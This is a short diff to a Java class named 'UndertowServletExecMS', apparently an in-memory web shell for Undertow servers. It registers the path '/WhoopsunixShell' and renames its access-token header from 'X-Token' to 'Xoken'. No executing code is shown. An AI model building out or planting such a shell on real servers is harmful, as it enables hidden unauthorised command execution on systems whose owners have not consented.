@@ -17,7 +17,7 @@ import java.util.Map;
 public class UndertowServletExecMS implements Servlet {
     private static String NAME = "Whoopsunix";
     private static String PATTERN = "/WhoopsunixShell";
-    private static String HEADER = "X-Token";
+    private static String HEADER = "Xoken";
 
 
     static {
